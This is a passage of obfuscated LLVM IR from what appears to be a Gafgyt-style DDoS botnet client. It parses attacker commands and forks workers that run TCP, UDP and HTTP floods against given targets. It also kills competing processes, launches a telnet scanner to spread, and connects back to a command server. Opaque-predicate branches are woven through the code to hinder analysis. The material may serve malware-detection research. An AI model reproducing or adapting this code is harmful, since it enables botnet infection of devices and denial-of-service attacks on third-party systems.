  %680 = load i8*, i8** %679, align 8
  %681 = call i32 @atoi(i8* %680) #10
  %682 = icmp sgt i32 %681, 32
  br i1 %682, label %749, label %683

; <label>:683:                                    ; preds = %677
  %684 = load i32, i32* @x.73
  %685 = load i32, i32* @y.74
  %686 = sub i32 %684, 1
  %687 = mul i32 %684, %686
  %688 = urem i32 %687, 2
  %689 = icmp eq i32 %688, 0
  %690 = icmp slt i32 %685, 10
  %691 = or i1 %689, %690
  br i1 %691, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %683
  %692 = load i32, i32* %3, align 4
  %693 = icmp sgt i32 %692, 6
  %694 = load i32, i32* @x.73
  %695 = load i32, i32* @y.74
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %693, label %702, label %708

; <label>:702:                                    ; preds = %originalBBpart288
  %703 = load i8**, i8*** %4, align 8
  %704 = getelementptr inbounds i8*, i8** %703, i64 6
  %705 = load i8*, i8** %704, align 8
  %706 = call i32 @atoi(i8* %705) #10
  %707 = icmp slt i32 %706, 0
  br i1 %707, label %749, label %708

; <label>:708:                                    ; preds = %702, %originalBBpart288
  %709 = load i32, i32* @x.73
  %710 = load i32, i32* @y.74
  %711 = sub i32 %709, 1
  %712 = mul i32 %709, %711
  %713 = urem i32 %712, 2
  %714 = icmp eq i32 %713, 0
  %715 = icmp slt i32 %710, 10
  %716 = or i1 %714, %715
  br i1 %716, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %708
  %717 = load i32, i32* %3, align 4
  %718 = icmp eq i32 %717, 8
  %719 = load i32, i32* @x.73
  %720 = load i32, i32* @y.74
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %718, label %727, label %750

; <label>:727:                                    ; preds = %originalBBpart292
  %728 = load i32, i32* @x.73
  %729 = load i32, i32* @y.74
  %730 = sub i32 %728, 1
  %731 = mul i32 %728, %730
  %732 = urem i32 %731, 2
  %733 = icmp eq i32 %732, 0
  %734 = icmp slt i32 %729, 10
  %735 = or i1 %733, %734
  br i1 %735, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %727
  %736 = load i8**, i8*** %4, align 8
  %737 = getelementptr inbounds i8*, i8** %736, i64 7
  %738 = load i8*, i8** %737, align 8
  %739 = call i32 @atoi(i8* %738) #10
  %740 = icmp slt i32 %739, 1
  %741 = load i32, i32* @x.73
  %742 = load i32, i32* @y.74
  %743 = sub i32 %741, 1
  %744 = mul i32 %741, %743
  %745 = urem i32 %744, 2
  %746 = icmp eq i32 %745, 0
  %747 = icmp slt i32 %742, 10
  %748 = or i1 %746, %747
  br i1 %748, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %740, label %749, label %750

; <label>:749:                                    ; preds = %originalBBpart296, %702, %677, %originalBBpart284, %649, %643, %640
  br label %980

; <label>:750:                                    ; preds = %originalBBpart296, %originalBBpart292
  %751 = load i8**, i8*** %4, align 8
  %752 = getelementptr inbounds i8*, i8** %751, i64 1
  %753 = load i8*, i8** %752, align 8
  store i8* %753, i8** %17, align 8
  %754 = load i8**, i8*** %4, align 8
  %755 = getelementptr inbounds i8*, i8** %754, i64 2
  %756 = load i8*, i8** %755, align 8
  %757 = call i32 @atoi(i8* %756) #10
  store i32 %757, i32* %18, align 4
  %758 = load i8**, i8*** %4, align 8
  %759 = getelementptr inbounds i8*, i8** %758, i64 3
  %760 = load i8*, i8** %759, align 8
  %761 = call i32 @atoi(i8* %760) #10
  store i32 %761, i32* %19, align 4
  %762 = load i8**, i8*** %4, align 8
  %763 = getelementptr inbounds i8*, i8** %762, i64 4
  %764 = load i8*, i8** %763, align 8
  %765 = call i32 @atoi(i8* %764) #10
  store i32 %765, i32* %20, align 4
  %766 = load i8**, i8*** %4, align 8
  %767 = getelementptr inbounds i8*, i8** %766, i64 5
  %768 = load i8*, i8** %767, align 8
  store i8* %768, i8** %21, align 8
  %769 = load i32, i32* %3, align 4
  %770 = icmp eq i32 %769, 8
  br i1 %770, label %771, label %776

; <label>:771:                                    ; preds = %750
  %772 = load i8**, i8*** %4, align 8
  %773 = getelementptr inbounds i8*, i8** %772, i64 7
  %774 = load i8*, i8** %773, align 8
  %775 = call i32 @atoi(i8* %774) #10
  br label %777

; <label>:776:                                    ; preds = %750
  br label %777

; <label>:777:                                    ; preds = %776, %771
  %778 = phi i32 [ %775, %771 ], [ 10, %776 ]
  %779 = load i32, i32* @x.73
  %780 = load i32, i32* @y.74
  %781 = sub i32 %779, 1
  %782 = mul i32 %779, %781
  %783 = urem i32 %782, 2
  %784 = icmp eq i32 %783, 0
  %785 = icmp slt i32 %780, 10
  %786 = or i1 %784, %785
  br i1 %786, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %777
  store i32 %778, i32* %22, align 4
  %787 = load i32, i32* %3, align 4
  %788 = icmp sgt i32 %787, 6
  %789 = load i32, i32* @x.73
  %790 = load i32, i32* @y.74
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %788, label %797, label %802

; <label>:797:                                    ; preds = %originalBBpart2100
  %798 = load i8**, i8*** %4, align 8
  %799 = getelementptr inbounds i8*, i8** %798, i64 6
  %800 = load i8*, i8** %799, align 8
  %801 = call i32 @atoi(i8* %800) #10
  br label %803

; <label>:802:                                    ; preds = %originalBBpart2100
  br label %803

; <label>:803:                                    ; preds = %802, %797
  %804 = phi i32 [ %801, %797 ], [ 0, %802 ]
  store i32 %804, i32* %23, align 4
  %805 = load i8*, i8** %17, align 8
  %806 = call i8* @strstr(i8* %805, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #10
  %807 = icmp ne i8* %806, null
  br i1 %807, label %808, label %862

; <label>:808:                                    ; preds = %803
  %809 = load i8*, i8** %17, align 8
  %810 = call i8* @strtok(i8* %809, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %810, i8** %24, align 8
  br label %811

; <label>:811:                                    ; preds = %originalBBpart2104, %808
  %812 = load i8*, i8** %24, align 8
  %813 = icmp ne i8* %812, null
  br i1 %813, label %814, label %845

; <label>:814:                                    ; preds = %811
  %815 = call i32 @listFork()
  %816 = icmp ne i32 %815, 0
  br i1 %816, label %827, label %817

; <label>:817:                                    ; preds = %814
  %818 = load i8*, i8** %24, align 8
  %819 = load i32, i32* %18, align 4
  %820 = load i32, i32* %19, align 4
  %821 = load i32, i32* %20, align 4
  %822 = load i8*, i8** %21, align 8
  %823 = load i32, i32* %23, align 4
  %824 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %818, i32 %819, i32 %820, i32 %821, i8* %822, i32 %823, i32 %824)
  %825 = load i32, i32* @mainCommSock, align 4
  %826 = call i32 @close(i32 %825)
  call void @_exit(i32 0) #12
  unreachable

; <label>:827:                                    ; preds = %814
  %828 = load i32, i32* @x.73
  %829 = load i32, i32* @y.74
  %830 = sub i32 %828, 1
  %831 = mul i32 %828, %830
  %832 = urem i32 %831, 2
  %833 = icmp eq i32 %832, 0
  %834 = icmp slt i32 %829, 10
  %835 = or i1 %833, %834
  br i1 %835, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %827
  %836 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %836, i8** %24, align 8
  %837 = load i32, i32* @x.73
  %838 = load i32, i32* @y.74
  %839 = sub i32 %837, 1
  %840 = mul i32 %837, %839
  %841 = urem i32 %840, 2
  %842 = icmp eq i32 %841, 0
  %843 = icmp slt i32 %838, 10
  %844 = or i1 %842, %843
  br i1 %844, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %811

; <label>:845:                                    ; preds = %811
  %846 = load i32, i32* @x.73
  %847 = load i32, i32* @y.74
  %848 = sub i32 %846, 1
  %849 = mul i32 %846, %848
  %850 = urem i32 %849, 2
  %851 = icmp eq i32 %850, 0
  %852 = icmp slt i32 %847, 10
  %853 = or i1 %851, %852
  br i1 %853, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %845
  %854 = load i32, i32* @x.73
  %855 = load i32, i32* @y.74
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %876

; <label>:862:                                    ; preds = %803
  %863 = call i32 @listFork()
  %864 = icmp ne i32 %863, 0
  br i1 %864, label %865, label %866

; <label>:865:                                    ; preds = %862
  br label %980

; <label>:866:                                    ; preds = %862
  %867 = load i8*, i8** %17, align 8
  %868 = load i32, i32* %18, align 4
  %869 = load i32, i32* %19, align 4
  %870 = load i32, i32* %20, align 4
  %871 = load i8*, i8** %21, align 8
  %872 = load i32, i32* %23, align 4
  %873 = load i32, i32* %22, align 4
  call void @sendTCP(i8* %867, i32 %868, i32 %869, i32 %870, i8* %871, i32 %872, i32 %873)
  %874 = load i32, i32* @mainCommSock, align 4
  %875 = call i32 @close(i32 %874)
  call void @_exit(i32 0) #12
  unreachable

; <label>:876:                                    ; preds = %originalBBpart2108
  br label %877

; <label>:877:                                    ; preds = %876, %634
  %878 = load i8**, i8*** %4, align 8
  %879 = getelementptr inbounds i8*, i8** %878, i64 0
  %880 = load i8*, i8** %879, align 8
  %881 = call i32 @strcmp(i8* %880, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #10
  %882 = icmp ne i32 %881, 0
  br i1 %882, label %956, label %883

; <label>:883:                                    ; preds = %877
  store i32 0, i32* %25, align 4
  store i64 0, i64* %26, align 8
  br label %884

; <label>:884:                                    ; preds = %942, %883
  %885 = load i32, i32* @x.73
  %886 = load i32, i32* @y.74
  %887 = sub i32 %885, 1
  %888 = mul i32 %885, %887
  %889 = urem i32 %888, 2
  %890 = icmp eq i32 %889, 0
  %891 = icmp slt i32 %886, 10
  %892 = or i1 %890, %891
  br i1 %892, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %884
  %893 = load i64, i64* %26, align 8
  %894 = load i64, i64* @numpids, align 8
  %895 = icmp ult i64 %893, %894
  %896 = load i32, i32* @x.73
  %897 = load i32, i32* @y.74
  %898 = sub i32 %896, 1
  %899 = mul i32 %896, %898
  %900 = urem i32 %899, 2
  %901 = icmp eq i32 %900, 0
  %902 = icmp slt i32 %897, 10
  %903 = or i1 %901, %902
  br i1 %903, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %895, label %904, label %945

; <label>:904:                                    ; preds = %originalBBpart2112
  %905 = load i32*, i32** @pids, align 8
  %906 = load i64, i64* %26, align 8
  %907 = getelementptr inbounds i32, i32* %905, i64 %906
  %908 = load i32, i32* %907, align 4
  %909 = icmp ne i32 %908, 0
  br i1 %909, label %910, label %941

; <label>:910:                                    ; preds = %904
  %911 = load i32*, i32** @pids, align 8
  %912 = load i64, i64* %26, align 8
  %913 = getelementptr inbounds i32, i32* %911, i64 %912
  %914 = load i32, i32* %913, align 4
  %915 = call i32 @getpid() #2
  %916 = icmp ne i32 %914, %915
  br i1 %916, label %917, label %941

; <label>:917:                                    ; preds = %910
  %918 = load i32, i32* @x.73
  %919 = load i32, i32* @y.74
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %917
  %926 = load i32*, i32** @pids, align 8
  %927 = load i64, i64* %26, align 8
  %928 = getelementptr inbounds i32, i32* %926, i64 %927
  %929 = load i32, i32* %928, align 4
  %930 = call i32 @kill(i32 %929, i32 9) #2
  %931 = load i32, i32* %25, align 4
  %932 = add nsw i32 %931, 1
  store i32 %932, i32* %25, align 4
  %933 = load i32, i32* @x.73
  %934 = load i32, i32* @y.74
  %935 = sub i32 %933, 1
  %936 = mul i32 %933, %935
  %937 = urem i32 %936, 2
  %938 = icmp eq i32 %937, 0
  %939 = icmp slt i32 %934, 10
  %940 = or i1 %938, %939
  br i1 %940, label %originalBBpart2119, label %originalBB114alteredBB

originalBBpart2119:                               ; preds = %originalBB114
  br label %941

; <label>:941:                                    ; preds = %originalBBpart2119, %910, %904
  br label %942

; <label>:942:                                    ; preds = %941
  %943 = load i64, i64* %26, align 8
  %944 = add i64 %943, 1
  store i64 %944, i64* %26, align 8
  br label %884

; <label>:945:                                    ; preds = %originalBBpart2112
  %946 = load i32, i32* %25, align 4
  %947 = icmp sgt i32 %946, 0
  br i1 %947, label %948, label %952

; <label>:948:                                    ; preds = %945
  %949 = load i32, i32* @mainCommSock, align 4
  %950 = load i32, i32* %25, align 4
  %951 = call i32 (i32, i8*, ...) @sockprintf(i32 %949, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i32 %950)
  br label %955

; <label>:952:                                    ; preds = %945
  %953 = load i32, i32* @mainCommSock, align 4
  %954 = call i32 (i32, i8*, ...) @sockprintf(i32 %953, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  br label %955

; <label>:955:                                    ; preds = %952, %948
  br label %956

; <label>:956:                                    ; preds = %955, %877
  %957 = load i32, i32* @x.73
  %958 = load i32, i32* @y.74
  %959 = sub i32 %957, 1
  %960 = mul i32 %957, %959
  %961 = urem i32 %960, 2
  %962 = icmp eq i32 %961, 0
  %963 = icmp slt i32 %958, 10
  %964 = or i1 %962, %963
  br i1 %964, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %956
  %965 = load i8**, i8*** %4, align 8
  %966 = getelementptr inbounds i8*, i8** %965, i64 0
  %967 = load i8*, i8** %966, align 8
  %968 = call i32 @strcmp(i8* %967, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i32 0, i32 0)) #10
  %969 = icmp ne i32 %968, 0
  %970 = load i32, i32* @x.73
  %971 = load i32, i32* @y.74
  %972 = sub i32 %970, 1
  %973 = mul i32 %970, %972
  %974 = urem i32 %973, 2
  %975 = icmp eq i32 %974, 0
  %976 = icmp slt i32 %971, 10
  %977 = or i1 %975, %976
  br i1 %977, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %969, label %979, label %978

; <label>:978:                                    ; preds = %originalBBpart2123
  call void @exit(i32 0) #14
  unreachable

; <label>:979:                                    ; preds = %originalBBpart2123
  br label %980

; <label>:980:                                    ; preds = %979, %865, %749, %originalBBpart280, %originalBBpart260, %312, %264, %245, %240, %217, %157, %152, %129, %115, %originalBBpart24, %62, %57, %32
  %981 = load i32, i32* @x.73
  %982 = load i32, i32* @y.74
  %983 = sub i32 %981, 1
  %984 = mul i32 %981, %983
  %985 = urem i32 %984, 2
  %986 = icmp eq i32 %985, 0
  %987 = icmp slt i32 %982, 10
  %988 = or i1 %986, %987
  br i1 %988, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %980
  %989 = load i32, i32* @x.73
  %990 = load i32, i32* @y.74
  %991 = sub i32 %989, 1
  %992 = mul i32 %989, %991
  %993 = urem i32 %992, 2
  %994 = icmp eq i32 %993, 0
  %995 = icmp slt i32 %990, 10
  %996 = or i1 %994, %995
  br i1 %996, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %35
  %997 = load i8**, i8*** %4, align 8
  %998 = getelementptr inbounds i8*, i8** %997, i64 0
  %999 = load i8*, i8** %998, align 8
  %1000 = call i32 @strcmp(i8* %999, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %1001 = icmp ne i32 %1000, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  %1002 = load i32, i32* @mainCommSock, align 4
  %1003 = call i32 (i32, i8*, ...) @sockprintf(i32 %1002, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i32 0, i32 0))
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %1004 = load i8**, i8*** %4, align 8
  %1005 = getelementptr inbounds i8*, i8** %1004, i64 1
  %1006 = load i8*, i8** %1005, align 8
  %1007 = call i32 @strcmp(i8* %1006, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %1008 = icmp ne i32 %1007, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %130
  %1009 = call i32 @fork() #2
  store i32 %1009, i32* %5, align 4
  %1010 = load i32, i32* @mainCommSock, align 4
  %1011 = call i32 (i32, i8*, ...) @sockprintf(i32 %1010, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %1012 = load i32, i32* %5, align 4
  %1013 = icmp ugt i32 %1012, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %158
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %175
  call void (i32, ...) bitcast (void ()* @TelnetScan to void (i32, ...)*)(i32 1)
  call void @_exit(i32 0) #12
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %192
  %1014 = load i8**, i8*** %4, align 8
  %1015 = getelementptr inbounds i8*, i8** %1014, i64 1
  %1016 = load i8*, i8** %1015, align 8
  %1017 = call i32 @strcmp(i8* %1016, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.68, i32 0, i32 0)) #10
  %1018 = icmp ne i32 %1017, 0
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %218
  %1019 = call i32 @fork() #2
  store i32 %1019, i32* %6, align 4
  %1020 = load i32, i32* @mainCommSock, align 4
  %1021 = call i32 (i32, i8*, ...) @sockprintf(i32 %1020, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i32 0, i32 0))
  %1022 = load i32, i32* %6, align 4
  %1023 = icmp ugt i32 %1022, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %282
  %1024 = call i32 @listFork()
  %1025 = icmp ne i32 %1024, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %313
  %1026 = load i8*, i8** %7, align 8
  %1027 = load i32, i32* %8, align 4
  call void @sendHTTP(i8* %1026, i32 %1027)
  %1028 = load i32, i32* @mainCommSock, align 4
  %1029 = call i32 @close(i32 %1028)
  call void @_exit(i32 0) #12
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %334
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %351
  %1030 = load i8**, i8*** %4, align 8
  %1031 = getelementptr inbounds i8*, i8** %1030, i64 0
  %1032 = load i8*, i8** %1031, align 8
  %1033 = call i32 @strcmp(i8* %1032, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0)) #10
  %1034 = icmp ne i32 %1033, 0
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %376
  %1035 = load i8**, i8*** %4, align 8
  %1036 = getelementptr inbounds i8*, i8** %1035, i64 3
  %1037 = load i8*, i8** %1036, align 8
  %1038 = call i32 @atoi(i8* %1037) #10
  %1039 = icmp eq i32 %1038, -1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %398
  %1040 = load i8**, i8*** %4, align 8
  %1041 = getelementptr inbounds i8*, i8** %1040, i64 2
  %1042 = load i8*, i8** %1041, align 8
  %1043 = call i32 @atoi(i8* %1042) #10
  %1044 = icmp eq i32 %1043, -1
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %432
  %1045 = load i8**, i8*** %4, align 8
  %1046 = getelementptr inbounds i8*, i8** %1045, i64 5
  %1047 = load i8*, i8** %1046, align 8
  %1048 = call i32 @atoi(i8* %1047) #10
  %1049 = icmp sgt i32 %1048, 65500
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %469
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %519
  %1050 = load i8*, i8** %10, align 8
  %1051 = call i8* @strtok(i8* %1050, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %1051, i8** %16, align 8
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %538
  %1052 = load i8*, i8** %16, align 8
  %1053 = icmp ne i8* %1052, null
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %560
  %1054 = load i8*, i8** %16, align 8
  %1055 = load i32, i32* %11, align 4
  %1056 = load i32, i32* %12, align 4
  %1057 = load i32, i32* %13, align 4
  %1058 = load i32, i32* %14, align 4
  %1059 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %1054, i32 %1055, i32 %1056, i32 %1057, i32 %1058, i32 %1059)
  %1060 = load i32, i32* @mainCommSock, align 4
  %1061 = call i32 @close(i32 %1060)
  call void @_exit(i32 0) #12
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %587
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %607
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %655
  %1062 = load i8**, i8*** %4, align 8
  %1063 = getelementptr inbounds i8*, i8** %1062, i64 4
  %1064 = load i8*, i8** %1063, align 8
  %1065 = call i32 @atoi(i8* %1064) #10
  %1066 = icmp eq i32 %1065, -1
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %683
  %1067 = load i32, i32* %3, align 4
  %1068 = icmp sgt i32 %1067, 6
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %708
  %1069 = load i32, i32* %3, align 4
  %1070 = icmp eq i32 %1069, 8
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %727
  %1071 = load i8**, i8*** %4, align 8
  %1072 = getelementptr inbounds i8*, i8** %1071, i64 7
  %1073 = load i8*, i8** %1072, align 8
  %1074 = call i32 @atoi(i8* %1073) #10
  %1075 = icmp slt i32 %1074, 1
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %777
  store i32 %778, i32* %22, align 4
  %1076 = load i32, i32* %3, align 4
  %1077 = icmp sgt i32 %1076, 6
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %827
  %1078 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0)) #2
  store i8* %1078, i8** %24, align 8
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %845
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %884
  %1079 = load i64, i64* %26, align 8
  %1080 = load i64, i64* @numpids, align 8
  %1081 = icmp ult i64 %1079, %1080
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %917
  %1082 = load i32*, i32** @pids, align 8
  %1083 = load i64, i64* %26, align 8
  %1084 = getelementptr inbounds i32, i32* %1082, i64 %1083
  %1085 = load i32, i32* %1084, align 4
  %1086 = call i32 @kill(i32 %1085, i32 9) #2
  %1087 = load i32, i32* %25, align 4
  %_ = shl i32 %1087, 1
  %_115 = sub i32 0, %1087
  %gen = add i32 %_115, 1
  %_116 = sub i32 0, %1087
  %gen117 = add i32 %_116, 1
  %1088 = add nsw i32 %1087, 1
  store i32 %1088, i32* %25, align 4
  br label %originalBB114

originalBB121alteredBB:                           ; preds = %originalBB121, %956
  %1089 = load i8**, i8*** %4, align 8
  %1090 = getelementptr inbounds i8*, i8** %1089, i64 0
  %1091 = load i8*, i8** %1090, align 8
  %1092 = call i32 @strcmp(i8* %1091, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i32 0, i32 0)) #10
  %1093 = icmp ne i32 %1092, 0
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %980
  br label %originalBB125
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #2
  store i32 46, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #10
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #10
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #10
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = load i32, i32* @x.75
  %38 = load i32, i32* @y.76
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %45, i32* @mainCommSock, align 4
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %48 = load i32, i32* %3, align 4
  %49 = call i32 @connectTimeout(i32 %46, i8* %47, i32 %48, i32 30)
  %50 = icmp ne i32 %49, 0
  %51 = load i32, i32* @x.75
  %52 = load i32, i32* @y.76
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %50, label %60, label %59

; <label>:59:                                     ; preds = %originalBBpart2
  store i32 1, i32* %1, align 4
  br label %61

; <label>:60:                                     ; preds = %originalBBpart2
  store i32 0, i32* %1, align 4
  br label %61

; <label>:61:                                     ; preds = %60, %59
  %62 = load i32, i32* %1, align 4
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %36
  %63 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %63, i32* @mainCommSock, align 4
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %66 = load i32, i32* %3, align 4
  %67 = call i32 @connectTimeout(i32 %64, i8* %65, i32 %66, i32 30)
  %68 = icmp ne i32 %67, 0
  br label %originalBB
}

